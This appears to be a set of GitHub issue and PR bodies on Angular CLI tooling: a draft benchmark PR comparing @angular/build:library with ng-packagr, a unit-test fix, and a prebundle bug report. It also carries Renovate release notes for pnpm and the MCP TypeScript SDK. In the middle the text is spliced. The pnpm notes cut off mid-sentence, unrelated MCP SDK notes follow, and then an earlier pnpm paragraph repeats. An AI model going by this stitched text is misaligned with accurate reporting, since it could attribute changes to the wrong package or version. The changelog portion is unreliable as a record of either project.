scripts/benchmarks/library-builder/ suite. NOT YET OPENED -- this is scratch content for
review before the user decides to go public. See .github/PULL_REQUEST_TEMPLATE.md in the
angular-cli checkout for the structure this maps onto.

Commit message convention for this change (verified against angular-cli's own
.ng-dev/commit-message.mjs + CONTRIBUTING.md): type `test`, scope `@angular/build`, e.g.
  test(@angular/build): add library builder scaling benchmark suite
-->


## PR Checklist

- [x] The commit message follows the guidelines (`test(@angular/build): ...`)
- [x] Tests for the changes have been added -- N/A, this PR *is* a benchmark/test tool, not a
      behavior change needing its own tests
- [x] Docs have been added -- `scripts/benchmarks/library-builder/README.md`

## PR Type

- [ ] Bugfix
- [ ] Feature
- [ ] Code style update (formatting, local variables)
- [ ] Refactoring (no functional changes, no api changes)
- [ ] Build related changes
- [ ] CI related changes
- [x] Documentation content changes
- [x] Other: adds a reproducible benchmark suite (no `packages/` source changes)

## What is the current behavior?

Issue Number: N/A

There is currently no way to measure how `@angular/build:library`'s build time scales with library size (entry-point count, nesting depth, or component style variant).

## What is the new behavior?

Adds `scripts/benchmarks/library-builder/`, a benchmark suite (following the existing `scripts/benchmarks/i18n/` suite's structure) that generates synthetic APF library fixtures at various sizes and times `@angular/build:library` cold builds against them. Run via:

```sh
pnpm build
pnpm admin benchmark library-builder
```

### Why this is useful

This was built while investigating a performance comparison against [ng-packagr](https://github.com/ng-packagr/ng-packagr) (a third-party APF build tool used by most existing Angular libraries today). That investigation found ng-packagr's build time **per entry point** grows super-linearly once a library exceeds roughly 300-500 secondary entry points -- doubling the library size costs noticeably more than double the build time.

Running the same fixture shapes through `@angular/build:library` found **no such growth**: its per-entry cost keeps falling as the library grows, with no climb even at the largest sizes tested (2000 flat entries / 2048 deeply-nested entries). It was also 1.8-13x faster than ng-packagr at matching sizes, with the gap widening as size increases.

| Entries (flat) | `@angular/build:library` | ng-packagr (median) | ng-packagr is... |
|---|---|---|---|
| 10 | 3.72s | 3.10s | 0.8x (ng-packagr's small-size overhead is lower here) |
| 50 | 3.71s | 6.50s | 1.8x slower |
| 300 | 5.29s | 24.18s | 4.6x slower |
| 1000 | 10.40s | 98.17s | 9.4x slower |
| 2000 | 20.96s | 257.57s | 12.3x slower |

(Deep/nested layout shows the same pattern: 13.0x slower for ng-packagr at the largest size, 2048 entries at tree depth 11.)

This doesn't necessarily reflect anything specific to `@angular/build:library`'s design beyond "it doesn't have this particular scaling problem" -- the two tools' pipelines are entirely different (different bundler, different incremental-compilation strategy), so this isn't a controlled "same work, different scheduler" comparison. But it is a useful data point: whatever makes ng-packagr's build time climb at scale is apparently not an inherent property of compiling many Angular library entry points, since a different pipeline handles the same fixtures without it.

This benchmark suite exists so that:
1. These numbers are independently reproducible by anyone, not just quoted in a PR description.
2. Future changes to `@angular/build:library`'s entry-point handling have a regression check
   for this specific scaling characteristic.

### Caveats

- Benchmarks only cold, one-shot builds. It does not exercise incremental rebuilds or watch mode.
- The sweep is intentionally small (5 sizes for flat layout, 4 depths for the nested layout, 2
  iterations each) -- enough to establish the shape of the curve, not a high-confidence
  statistical comparison.
- Absolute numbers are specific to the machine they're collected on; the *shape* of the
  per-entry-cost curve (grows with size, or doesn't) is the more portable finding across
  hardware.

## Does this PR introduce a breaking change?

- [ ] Yes
- [x] No

## Other information

No changes to any `packages/` source in this PR -- only new benchmark tooling and documentation under `scripts/benchmarks/library-builder/`, plus wiring it into the existing `scripts/benchmark.mts` dispatcher as a new `library-builder` subsystem alongside `i18n`.

Issues.Body:

This PR contains the following updates: | Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Adoption](https://docs.renovatebot.com/merge-confidence/) | [Passing](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) | |---|---|---|---|---|---| | [pnpm](https://pnpm.io) ([source](https://redirect.github.com/pnpm/pnpm/tree/HEAD/pnpm/npm/pnpm)) | [`12.8.1` → `12.10.1`](https://renovatebot.com/diffs/npm/pnpm/12.8.1/12.10.1) | ![age](https://developer.mend.io/api/mc/badges/age/npm/pnpm/12.10.1?slim=true) | ![adoption](https://developer.mend.io/api/mc/badges/adoption/npm/pnpm/12.10.1?slim=true) | ![passing](https://developer.mend.io/api/mc/badges/compatibility/npm/pnpm/12.8.1/12.10.1?slim=true) | ![confidence](https://developer.mend.io/api/mc/badges/confidence/npm/pnpm/12.8.1/12.10.1?slim=true) | --- - [ ] If you want to rebase/retry this PR, check this box --- ### Release Notes
pnpm/pnpm (pnpm) ### [`v12.10.1`](https://redirect.github.com/pnpm/pnpm/releases/tag/v12.10.1): pnpm 12.10.1 [Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v12.10.0...v12.10.1) This release fixes `pnpm install` failures after an `overrides` change and on a filtered frozen install with `catalogPrune`. It also fixes several bugs in the experimental `nodeLinker.type: loaded`, which now keeps its generated files in `node_modules`. ##### Patch Changes - With `nodeLinker.type: loaded`, pnpm now writes its generated files to `node_modules`, which projects already ignore in git. The store manifest and loader are `node_modules/.pnpm/.store-manifest.json` and `node_modules/.pnpm/.store-loader.mjs`. Bin shims are in `node_modules/.bin`. Earlier versions wrote `.pnpm-store.json` and `.pnpm-store-loader.mjs` to the project root, and a `.pnpm` directory to the root and to each workspace package. Delete them after reinstalling. - With `nodeLinker.type: loaded`, packages that ship their own `node_modules` directory, such as `npm` with its bundled dependencies, now load from the store. Before, one such package in the install stopped every Node.js process from starting. - With `nodeLinker.type: loaded`, scripts can now run a Node.js runtime installed through `devEngines.runtime`. Before, every script that called `node` re-ran its own shim until it failed with "Argument list too long". - With `nodeLinker.type: loaded`, Node.js processes start faster. In a project with 13,000 stored files, the startup overhead per process dropped from 67 ms to 18 ms. - `pnpm install` no longer fails with `ERR_PNPM_NO_MATCHING_VERSION` after a change to `overrides` when the lockfile resolves an optional peer dependency to an npm alias of another package [#​16654](https://redirect.github.com/pnpm/pnpm/issues/16654). - A frozen install with `catalogPrune` no longer removes catalog entries that `pnpm-lock.yaml` still records. Before, `pnpm install --frozen-lockfile --filter` failed with `ERR_PNPM_LOCKFILE_CONFIG_MISMATCH` when some workspace projects were missing from disk [#​16638](https://redirect.github.com/pnpm/pnpm/issues/16638). - `pnpm install --fix-lockfile` no longer removes the `deprecated` and `hasBin` fields from lockfile entries [#​6600](https://redirect.github.com/pnpm/pnpm/issues/6600). - With `enableGlobalVirtualStore`, an install that updates `node_modules` now repairs a package in the global virtual store that an interrupted install left without some of its dependency links or package files. Before, such an install kept the incomplete package if the project's `node_modules` already recorded it [#​16642](https://redirect.github.com/pnpm/pnpm/issues/16642). - `pnpm install` now skips the Cargo and Python projects inside a nested directory that has its own `pnpm-workspace.yaml` or `.git` directory, such as a git worktree of the same workspace or a separate clone. - The `Request took` warning for package metadata now starts timing when pnpm sends the request. Before, it also counted the time the request waited for a free request slot, so large installs printed it for requests the registry answered quickly. ##### Platinum Sponsors
##### Gold Sponsors
❗ **Important** > > ✂ PR body was truncated to here. --- ### Configuration, setup, and pnpm versions - `pnpm config get --global` and `pnpm config list --global` now show only the global configuration, also when run inside a project. Settings from the project's `pnpm-workspace.yaml` and `.npmrc` were included before. The same applies to `--location=global` [#​16598](https://redirect.github.com/pnpm/pnpm/issues/16598). - pnpm now prints config warnings, such as an unset environment variable in `.npmrc`, when loading the config fails. - pnpm 11 releases older than 11.28.4 can run pnpm 12 again when the `packageManager` field pins it. Since 12.9.0 they failed with `SyntaxError: Invalid or unexpected token` [#​16594](https://redirect.github.com/pnpm/pnpm/issues/16594). - On Windows, `pnpm self-update` no longer runs the update a second time when it replaces a `pnpm.cmd` linked by pnpm 12.8 or older. cmd.exe read on in the replaced `pnpm.cmd`, printed an error about a command that is not recognized, and ran the new pnpm once more [#​16573](https://redirect.github.com/pnpm/pnpm/issues/16573). - `pnpm setup` now puts `$PNPM_HOME/bin` first on `PATH` in login shells that inherited it further down, such as the VS Code terminal on macOS. Before, another `node` took precedence over the one installed by `pnpm runtime set node -g`. Run `pnpm setup` again to update the block in your shell config [#​16635](https://redirect.github.com/pnpm/pnpm/issues/16635). - `pnpm setup` now names the shell config file even if it is already up to date [#​16608](https://redirect.github.com/pnpm/pnpm/issues/16608). ##### Updating, auditing, and publishing - `pnpm update --latest` now applies the `savePrefix` setting when it rewrites a dependency whose range has no operator of its own, such as `<2.0.0`. - The interactive `pnpm audit --fix` picker now shows each patched version with the `saveExact` and `savePrefix` style that the override is written with [#​13209](https://redirect.github.com/pnpm/pnpm/issues/13209). - `pnpm unpublish @` now deletes the tarball under the registry's path when the registry is served under one, such as Gitea's npm registry. It used to send the delete to the host root and report success without removing the version [#​16568](https://redirect.github.com/pnpm/pnpm/issues/16568). It also no longer mistakes a sibling path such as `/npm-mirror/` for the registry path `/npm/` [pnpm/tasks#94](https://redirect.github.com/pnpm/tasks/issues/94). ##### Output and messages - A warning about a project's `devEngines` or `packageManager` pin is now printed to stderr. A command such as `pnpm cache path` or `pnpm list --json` keeps only its own output on stdout [#​16584](https://redirect.github.com/pnpm/pnpm/issues/16584). - `pnpm list` now reports the correct package paths when `nodeLinker` is `hoisted` [#​9593](https://redirect.github.com/pnpm/pnpm/issues/9593). - Resolution errors now name the failing dependency and its parent packages. Fatal errors appear as structured error records with their error codes when using `--reporter=ndjson`. - The error for an invalid git repository in the lockfile now has the code `ERR_PNPM_INVALID_GIT_REPOSITORY`. Its message now lists every rejected form of the value. - `pnpm runtime --help` and `pnpm help runtime` now name the `set` subcommand and the runtimes it accepts [#​16580](https://redirect.github.com/pnpm/pnpm/issues/16580). ##### Platinum Sponsors
##### Gold Sponsors
### [`v12.9.1`](https://redirect.github.com/pnpm/pnpm/releases/tag/v12.9.1): pnpm 12.9.1 [Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v12.9.0...v12.9.1) This release moves the WebContainer build into a separate `@pnpm/wasm` package, shrinks the `pnpm` package back to about 4 MB, and fixes `pnpm publish` with provenance from GitLab CI. ##### Patch Changes - The WebAssembly build for StackBlitz WebContainers now ships as a separate `@pnpm/wasm` package. The `pnpm` and `@pnpm/exe` packages no longer include it, which brings their unpacked size back from about 55 MB to about 4 MB. In a WebContainer, install `@pnpm/wasm` with npm to get the `pnpm` command. - `pnpm publish` with provenance from GitLab CI is no longer rejected by the npm registry with a 422 error. The provenance statement now includes the GitLab CI variables in `invocation.parameters`, as npm does [#​16551](https://redirect.github.com/pnpm/pnpm/issues/16551). - `pnpm audit signatures` now uses the TLS settings of the redirect target when a registry redirects its signing-keys request, for example to registry.npmjs.org. A `cafile` scoped to a private registry no longer makes the redirected request fail [#​16541](https://redirect.github.com/pnpm/pnpm/issues/16541). - Fixed `pnpm install --frozen-lockfile` rejecting an up-to-date lockfile when an injected workspace package uses a catalog entry in `peerDependencies` [#​16557](https://redirect.github.com/pnpm/pnpm/issues/16557). - The `[]` filter selector works again with Git 2.24 through 2.27 [#​16561](https://redirect.github.com/pnpm/pnpm/issues/16561). With Git older than 2.24, the selector now fails with an error that names the required Git version. It also detects changes in projects whose directory names contain non-ASCII characters. Such a change used to be credited to the parent project. `changedFilesIgnorePattern` and `testPattern` now match changed files whose names contain non-ASCII characters. - The `pnpm` executable is about 10% smaller. On macOS arm64 it went from 45.1 MB to 40.3 MB. - Sped up trust downgrade checks for packages with long release histories. - With `optimisticRepeatInstall: false`, `pnpm install` now runs the projects' own lifecycle scripts, such as `prepare`, even when `node_modules` is already up to date [#​16545](https://redirect.github.com/pnpm/pnpm/issues/16545). - `pnpm self-update` now fails for Homebrew-installed pnpm and prints the `brew upgrade` command for the installed formula, such as `brew upgrade pnpm` or `brew upgrade pnpm@11`. It used to install a second copy of pnpm that the Homebrew one kept shadowing [#​16547](https://redirect.github.com/pnpm/pnpm/issues/16547). ##### Platinum Sponsors
##### Gold Sponsors
### [`v12.9.0`](https://redirect.github.com/pnpm/pnpm/releases/tag/v12.9.0): pnpm 12.9 [Compare Source](https://redirect.github.com/pnpm/pnpm/compare/v12.8.2...v12.9.0) This release runs pnpm in StackBlitz WebContainers, adds a per-registry `networkConcurrency` setting, and records every installed project in the store. It also carries a security fix for `pnpm login`. ##### Minor Changes - pnpm now automatically uses WebAssembly in StackBlitz WebContainers, including when installation scripts are disabled. Native installations continue to use the native executable when installation scripts are enabled. - A `registries` entry can now set `networkConcurrency`, the most requests pnpm keeps in flight to that registry's origin. Requests to other registries keep the overall limit. The setting may live in `pnpm-workspace.yaml` or the global `config.yaml`. ```yaml registries: https://npm.corp.example.com/: scopes: ["@acme"] networkConcurrency: 4 ``` - `pnpm install` now records every project it installs in the store's `projects` directory, as a symlink to the project directory. A `--frozen-store` install without the global virtual store still records nothing. Only projects that used the global virtual store were recorded before [#​6929](https://redirect.github.com/pnpm/pnpm/issues/6929). ##### Patch Changes - `pnpm login` no longer forwards credentials in its request body to another origin during redirects. ##### Installing packages - Fixed `pnpm install` failing on Android with `ERR_PNPM_STORE_DIR_ACQUIRE_OPERATION_LOCK` [#​16508](https://redirect.github.com/pnpm/pnpm/issues/16508). - `pnpm install --frozen-lockfile` again succeeds when a workspace project recorded in `pnpm-lock.yaml` has no directory, such as a project left out of a Docker build context. It still fails if the project's directory exists without a `package.json` [#​16453](https://redirect.github.com/pnpm/pnpm/issues/16453). - `pnpm install --frozen-lockfile` no longer requires a `pnpm-lock.yaml` in a project that has no dependencies. It also succeeds when `pnpm-lock.yaml` records only the pinned pnpm version, as other commands write it when they run before the first install [#​16477](https://redirect.github.com/pnpm/pnpm/issues/16477). - Fixed `pnpm install --frozen-lockfile` rejecting a fresh lockfile when an injected workspace dependency has an optional peer supplied by another workspace project [#​16428](https://redirect.github.com/pnpm/pnpm/issues/16428). - With `nodeLinker: hoisted`, a filtered install now keeps the packages of the workspace projects an earlier install put in `node_modules`. This also covers the install that `pnpm --filter run` and `pnpm --filter exec` start before the command. Before, these installs removed every package that only the unselected projects needed [#​16483](https://redirect.github.com/pnpm/pnpm/issues/16483). - `pnpm install` with `nodeLinker: hoisted` now refreshes directories supplied by custom fetchers when reinstalling. pnpm also keeps the symlinks inside those directories. - With `enableGlobalVirtualStore` on, scripts can run entry points that a CommonJS require hook loads again, such as `ts-node index.ts`. They failed with `ERR_UNKNOWN_FILE_EXTENSION` on Node.js versions without built-in TypeScript support [#​16436](https://redirect.github.com/pnpm/pnpm/issues/16436). - pnpm now keeps each project's current lockfile and hidden hoisted dependencies in its own `node_modules/.pnpm` when `virtualStoreDir` points at a shared global virtual store. `--virtual-store-dir` now sets the global virtual store's location too [pnpm/tasks#47](https://redirect.github.com/pnpm/tasks/issues/47). - `pnpm clean` no longer deletes the project when `virtualStoreDir` or `globalVirtualStoreDir` is set to the project directory. It also leaves a directory outside the project alone when the setting reaches it through a symlink. It now removes a global virtual store that `globalVirtualStoreDir` places inside the project, as it does for `virtualStoreDir`. ##### Optional dependencies - `pnpm install` no longer fails when a dependency of an optional dependency is missing from the registry. Like npm, pnpm now leaves out the nearest optional dependency above it, together with its subtree [#​16511](https://redirect.github.com/pnpm/pnpm/issues/16511). - When an optional dependency fails to build, pnpm now removes its link from `node_modules`. A repeat `pnpm install` then reports "Already up to date" and no longer reruns the failing build [#​16468](https://redirect.github.com/pnpm/pnpm/issues/16468). - `pnpm install` now prints a warning with the error when an optional dependency cannot be fetched and is skipped. The skipped package is no longer counted in the `Packages: +N` summary. The `pnpm:skipped-optional-dependency` log reports the skip with the `fetch_failure` reason [#​16514](https://redirect.github.com/pnpm/pnpm/issues/16514). ##### Resolving dependencies - Fixed `pnpm install` changing an unchanged project's direct dependency to a sibling workspace's pinned version when its dependency tree contains a cycle [#​16417](https://redirect.github.com/pnpm/pnpm/issues/16417). - With `autoDedupe` enabled, downgrading a dependency in one workspace project now moves the other projects to that version when it satisfies their ranges. This also applies to a filtered `pnpm --filter add` [#​16432](https://redirect.github.com/pnpm/pnpm/issues/16432). - `pnpm install` and `pnpm dedupe` now move an optional peer to the version already in the dependency graph when no other package provides its locked version anymore. After a bump such as `vue` 3.5.40 to 3.5.43, the lockfile kept a second copy of `@vue/server-renderer` for `@vue/test-utils` [#​16443](https://redirect.github.com/pnpm/pnpm/issues/16443). - `pnpm dedupe --check` no longer fails right after `pnpm install` when a project's optional peer is satisfied by a package another workspace project installs. `pnpm dedupe` now picks the same versions for that package's dependencies as `pnpm install` [#​16447](https://redirect.github.com/pnpm/pnpm/issues/16447). - `pnpm install` no longer re-resolves an up-to-date lockfile on every run when a patched package is a peer in a peer cycle [#​16418](https://redirect.github.com/pnpm/pnpm/issues/16418). - With `autoDedupe` enabled, `pnpm install --lockfile-only` no longer resolves the dependency graph again when nothing changed since an earlier `--lockfile-only` install deduplicated the lockfile. Such an install keeps the lockfile even if versions were published since it was written, or if only a setting such as `resolutionMode` changed. Run `pnpm dedupe` to apply such a change [#​16458](https://redirect.github.com/pnpm/pnpm/issues/16458). ##### Speed and network - A repeat `pnpm install` in a large workspace reports "Already up to date" faster [#​16487](https://redirect.github.com/pnpm/pnpm/issues/16487). - Sped up dependency resolution of workspaces with many peer dependencies. - `pnpm install` sends fewer registry metadata requests when the lockfile already decides which version a range resolves to. This now also covers ranges that several locked versions satisfy when one of them outranks the others, and direct dependencies kept at their locked version. Packages that `minimumReleaseAgeExclude` lists without a version now reuse cached registry metadata the same way they do when `minimumReleaseAge` is not set [#​16458](https://redirect.github.com/pnpm/pnpm/issues/16458). - pnpm no longer downloads every packument again on each install from a registry whose metadata responses forbid caching, such as `Cache-Control: no-store`. pnpm revalidates the cached metadata with a conditional request, so a registry that supports conditional requests answers with a 304 when the package has not changed [#​16528](https://redirect.github.com/pnpm/pnpm/issues/16528). - Cached metadata for a package published within `minimumReleaseAge` is now revalidated with its ETag, so the npm registry can answer `304 Not Modified`. Before, the next install that checked the cache downloaded the whole document again [#​16506](https://redirect.github.com/pnpm/pnpm/issues/16506). - A fetch timeout while other downloads from the same host are still running now lowers concurrency for that host to one connection. Retries of that request, and later downloads from that host, use the lower concurrency. Other hosts keep the configured concurrency [#​12791](https://redirect.github.com/pnpm/pnpm/issues/12791). - Sped up `pnpm install --offline` when the version a range picks is not in the store. While it looks for a version the store holds, pnpm now reads only the versions the range admits [#​16495](https://redirect.github.com/pnpm/pnpm/issues/16495). - `pnpm install --offline` now reuses config dependency tarballs that are already present in the store [pnpm/tasks#46](https://redirect.github.com/pnpm/tasks/issues/46). ##### Running scripts - `pnpm -s

### [`v2.3.0`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/releases/tag/%40modelcontextprotocol/server%402.3.0)

[Compare Source](https://redirect.github.com/modelcontextprotocol/typescript-sdk/compare/@modelcontextprotocol/server@2.2.0...@modelcontextprotocol/server@2.3.0)

##### Minor Changes

- [#​2929](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2929) [`40f8f4e`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/40f8f4e229d963cd7fd2890bda2aeebe7005299a) Thanks [@​claude](https://redirect.github.com/apps/claude)! - `requireBearerAuth` and `verifyBearerToken` take a new optional `expectedResource`, which makes them accept only tokens issued for this resource (the token's audience). Set it to the value your authorization server puts into tokens meant for this server, usually the server's URL. When it is set, a token is accepted only if the verifier reports that value in `AuthInfo.resource`; the two are compared as strings, ignoring a fragment and one trailing slash. A token reported for another value, or for none, is answered `401 invalid_token` with the usual `WWW-Authenticate` challenge. When it is not set, nothing changes. To use it, pass `expectedResource` and have `verifyAccessToken` fill `AuthInfo.resource`, for example from the `aud` claim. The option is declared on a new exported type, `VerifyBearerTokenOptions`, which extends `BearerAuthOptions`; `BearerAuthOptions` itself is unchanged. The Express `requireBearerAuth` passes the option through. With Express, `@modelcontextprotocol/express` has to be upgraded to this release as well: 2.0.1 does not pass the option on, so nothing is compared. Its options type does not have the option, so TypeScript reports an `expectedResource` written in a call to the 2.0.1 `requireBearerAuth` as an error.

- [#​2926](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2926) [`6d8dbc6`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/6d8dbc6cb590edf766fcb66b636ca6b654e99c37) Thanks [@​claude](https://redirect.github.com/apps/claude)! - `McpServer` now accepts a `maxToolInputElements` option that limits the number of elements in tool-call arguments: the largest combined number of array elements and object members a single `tools/call` `arguments` payload may contain. It is off by default, so behavior is unchanged unless you set it. When it is set and a call exceeds it, that call is answered with an `isError: true` tool result that names the limit, before the input schema runs, and the server keeps serving. Set it above the largest arguments your tools legitimately accept; `maxRequestBodySize` remains the primary limit on request size. The value must be a number of at least 1, or `Infinity` for no limit; any other value is rejected at construction. The options type is exported as `McpServerOptions`.

- [#​2918](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2918) [`84804c2`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/84804c22e45a662675a198f853b7f00063838a8d) Thanks [@​claude](https://redirect.github.com/apps/claude)! - A `Server` or `McpServer` now serves one connection at a time, and a Streamable HTTP server transport without sessions (`sessionIdGenerator: undefined`) serves one request. An app that uses one server object, or one stateless transport, for every HTTP request fails on the second request after this upgrade. Build the server and the transport per request instead.

  What keeps working without a change:

  - `createMcpHandler(buildServer)` and `serveStdio(buildServer)`, where `buildServer` returns a new server on every call.
  - A handler that builds a new server and a new stateless transport for each request.
  - One server and one transport per session (a transport with a `sessionIdGenerator`).
  - Connecting a server again after `close()`.
  - `Client`.

  What fails now, how it shows, and what to change:

  - One server object with a new stateless transport per request (`const server = new McpServer(...)` outside the handler, `await server.connect(transport)` inside it): the second HTTP request the process receives fails, and so does every later one. `connect()` rejects with an `SdkError` of code `ALREADY_CONNECTED`. If the handler closes the transport when the response ends, requests that arrive one after the other still work and a request that overlaps another one fails. Change: move `new McpServer(...)` and its registrations into the handler.
  - One stateless transport for every request (a transport built once with `sessionIdGenerator: undefined`): the second HTTP request fails. `WebStandardStreamableHTTPServerTransport.handleRequest()` rejects with `Stateless transport cannot be reused across requests. Create a new transport per request.`, and `NodeStreamableHTTPServerTransport.handleRequest()` answers `500`. Change: build the server and the transport inside the handler and connect them there.
  - `createMcpHandler(() => server)` with a server built once: a request that arrives after the previous response has been read to its end still works. A request that arrives while another one is being served is answered `500` with the JSON-RPC error `-32603` (`Internal server error`); the reason is reported only through the `onerror` option. Change: pass a function that builds the server, as in `createMcpHandler(buildServer)`.
  - One server object for every session: the `initialize` request of the second session fails with `ALREADY_CONNECTED`. Change: build a server per session.

  What the caller sees when `connect()` or `handleRequest()` rejects depends on the host. Express 5, Fastify and Hono answer `500`. A plain `node:http` listener without its own error handling gets an unhandled rejection, which ends the process.

  The README examples of `@modelcontextprotocol/express`, `@modelcontextprotocol/fastify`, `@modelcontextprotocol/hono` and `@modelcontextprotocol/node`, and the handler examples in the JSDoc of `WebStandardStreamableHTTPServerTransport` and `NodeStreamableHTTPServerTransport`, now build a server and a transport per request.

- [#​2907](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2907) [`e55f9ac`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/e55f9ac1b1cae413599b499cbaa45c0378edba78) Thanks [@​claude](https://redirect.github.com/apps/claude)! - `allowedOrigins` and `validateOriginHeader` accept lowercase entries of the form `<scheme>://*`, such as `moz-extension://*` or `chrome-extension://*`, which admit every origin of that scheme. This lets a server admit MCP clients that run as a browser extension when the extension ID cannot be listed, as on Firefox, where it differs on every install. `http://*` and `https://*` are not honoured, and the defaults are unchanged.

##### Patch Changes

- [#​2599](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2599) [`5238fba`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/5238fba4424f82ec1ae9f6f458dd655ab322062d) Thanks [@​freya0926](https://redirect.github.com/freya0926)! - A server can now serve, and a client can now call, `tasks/get` and `tasks/cancel` of the Tasks extension (SEP-2663) on a 2026-07-28 connection, when the handler is registered and the request is sent with an explicit schema. Every other method that a protocol revision removed is still refused. If one server factory serves both eras and such a handler is meant for 2025-era clients only, register it only when `ctx.era === 'legacy'`.

- [#​2107](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2107) [`2fc49ea`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/2fc49eaf17a6b9ac0810c875cc96d3b949f9522c) Thanks [@​pragnyanramtha](https://redirect.github.com/pragnyanramtha)! - `prompts/get` without `arguments` no longer fails with "Invalid arguments" when every argument of the prompt is optional. A missing `arguments` is now validated as `{}`, as it already is for `tools/call`, so a top-level `.optional()` or `.default(...)` on `argsSchema` no longer sees `undefined`.

- [#​2889](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2889) [`4d94e7b`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/4d94e7b1ccf769d94a7bbba7789f1ee6c7dfdd8c) Thanks [@​claude](https://redirect.github.com/apps/claude)! - `registerTool` no longer converts tool schemas up front, so a server built per request stops converting every tool on every request. The warning about an invalid `x-mcp-header` declaration now appears each time tools are listed, not when the tool is registered.

- [#​2908](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2908) [`633dd3e`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/633dd3e12bff6869c932c4a526341622320912b1) Thanks [@​claude](https://redirect.github.com/apps/claude)! - The `license` field of the package manifests is now `Apache-2.0`; the `LICENSE` file shipped in each package carries the full terms, including the MIT text for earlier contributions. No code change.

- [#​2841](https://redirect.github.com/modelcontextprotocol/typescript-sdk/pull/2841) [`2237555`](https://redirect.github.com/modelcontextprotocol/typescript-sdk/commit/2237555ed036c3e80341c0f3c28684e9c3ff0728) Thanks [@​sharziki](https://redirect.github.com/sharziki)! - `McpServer.registerPrompt()` now types the callback correctly when no `argsSchema` is given: its one parameter is the server context. Before, reading `ctx.mcpReq` there was a type error although it worked at runtime. Prompts registered with an `argsSchema` are unchanged.

This release fixes `pnpm install` failures after an `overrides` change and on a filtered frozen install with `catalogPrune`. It also fixes several bugs in the experimental `nodeLinker.type: loaded`, which now keeps its generated files in `node_modules`.

##### Patch Changes

- With `nodeLinker.type: loaded`, pnpm now writes its generated files to `node_modules`, which projects already ignore in git. The store manifest and loader are `node_modules/.pnpm/.store-manifest.json` and `node_modules/.pnpm/.store-loader.mjs`. Bin shims are in `node_modules/.bin`.

Issues.Title: fix(@angular/build): prevent missing NgModule scope errors in unit tests
Issues.Body:
Previously, `rootFiles` was used to restrict TypeScript compilation root names to only the test files to be executed. However, when an application `tsconfig.spec.json` includes application source files (standard for NgModule-based applications), non-standalone components rely on `AppModule` being present in the TypeScript program's root names for the Angular compiler to determine their compilation scope. Restricting root names caused template diagnostic errors such as `NG8001: '<element>' is not a known element`.

This change replaces the root file allowlisting in the unit-test runner with an `excludeRootFiles` option that excludes unselected test files from the compilation roots. This ensures application files and NgModule definitions remain in the program while still ignoring unselected test files with compilation errors.

Closes #34231

Issues.Title: dev-server: es2016 prebundle target for zone.js apps lowers private fields and breaks dependencies
Issues.Body:
## Command

serve

## Is this a regression?

- [x] Yes, this behavior used to work in the previous version

## The previous version in which this bug was not present was

22.0.1

## Description

Since #33772 (22.1.4), the dev server prebundles dependencies with an `es2016` target for zone.js apps, so async/await gets lowered (#33770). But rolldown can't lower only async/await like esbuild's `supported: { 'async-await': false }` did. With `es2016`, it lowers everything newer, including private fields.

That hits an oxc bug: when a static private field is lowered, the helper references the class by name, and if the method has a local with the same name, it reads the local in its TDZ. Minified libraries hit this easily, because the minifier reuses `t` for both. In our case iX modals can't be closed anymore in `ng serve`. Production is fine, since it doesn't prebundle and esbuild only lowers async/await.

The oxc bug itself: https://github.com/oxc-project/oxc/issues/27376

I know the actual bug is in oxc, but every zone.js app now runs all its dependencies through a much bigger transform in dev than in production, which is how we ran into it. It'd be great if the prebundle could only lower async/await again. One idea: the prebundle already runs Angular's Babel step for the linker, so `@babel/plugin-transform-async-to-generator` could do it there and rolldown could keep the real browser targets. I didn't test that though.

## Minimal Reproduction

https://github.com/felix-eschey/ix-modal

```sh
git clone https://github.com/felix-eschey/ix-modal && cd ix-modal
npm ci
npm run broken    # ng serve on http://localhost:4300 with zone.js
```

Open http://localhost:4300, click "Open modal" and then Cancel. The modal stays open and the console shows the `ReferenceError`. `npm run working` is the same app without zone.js and works. `npm run excluded` keeps zone.js but excludes iX from `prebundle` and works too.

## Exception or Error

```
ReferenceError: Cannot access 't' before initialization
    at t$8.ensureCache (p-BqeSHO6C.js:1:304)
    at get mediumTime (p-BqeSHO6C.js:1:1189)
```

## Your Environment

```
Angular CLI       : 22.1.7
Angular           : 22.1.6
Node.js           : 24.18.0
Package Manager   : npm 11.16.0
Operating System  : linux x64

@angular/build    : 22.1.7
zone.js           : 0.15.1
```

## Anything else relevant?

Workaround is `prebundle: { exclude: [...] }` for the affected packages. iX issue: https://github.com/siemens/ix/issues/2874
